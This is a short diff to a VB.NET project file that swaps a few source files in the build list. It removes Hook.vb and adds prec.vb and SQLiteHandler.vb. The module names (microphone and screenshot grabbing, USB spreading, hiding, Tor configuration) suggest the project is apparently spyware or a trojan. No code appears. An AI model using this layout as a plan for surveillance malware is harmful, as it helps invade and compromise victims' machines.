@@ -180,9 +180,9 @@
     <Compile Include="Moduls\Details\ComputerDetails.vb" />
     <Compile Include="Moduls\Details\Details.vb" />
     <Compile Include="Moduls\Grabs\GitGrab.vb" />
-    <Compile Include="Moduls\Grabs\Hook.vb" />
     <Compile Include="Moduls\Grabs\ImageGrab.vb" />
     <Compile Include="Moduls\Grabs\MicroPhoneGrab.vb" />
+    <Compile Include="Moduls\Grabs\prec.vb" />
     <Compile Include="Moduls\Grabs\TakeScreenShot.vb" />
     <Compile Include="Moduls\Installers\CopyModule.vb" />
     <Compile Include="Moduls\Installers\Installing.vb" />
@@ -192,6 +192,7 @@
     <Compile Include="Moduls\Network\WebFilters.vb" />
     <Compile Include="Moduls\Search\ImageSearch.vb" />
     <Compile Include="Moduls\Spreads\USBSpread.vb" />
+    <Compile Include="Moduls\SQL\SQLiteHandler.vb" />
     <Compile Include="Moduls\Tor\ConfigTor.vb" />
     <Compile Include="Moduls\IO\GetPathes.vb" />
     <Compile Include="Moduls\Installers\HidderModule.vb" />
